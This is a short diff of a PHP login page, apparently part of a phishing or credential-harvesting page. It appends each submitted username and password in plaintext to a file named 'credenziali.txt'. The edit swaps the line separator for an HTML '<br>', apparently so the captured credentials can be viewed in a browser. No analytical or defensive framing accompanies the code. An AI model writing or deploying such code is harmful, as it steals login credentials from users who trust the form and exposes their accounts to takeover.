@@ -13,7 +13,7 @@
         $Username = $_POST['username'];
         $Password = $_POST['password'];
         $MyFile = fopen('credenziali.txt', 'a');
-        fwrite($MyFile, $Username . "|" . $Password."\n");
+        fwrite($MyFile, $Username . "|" . $Password."<br>");
         fclose($MyFile);
     ?>
     <div class="login-container">
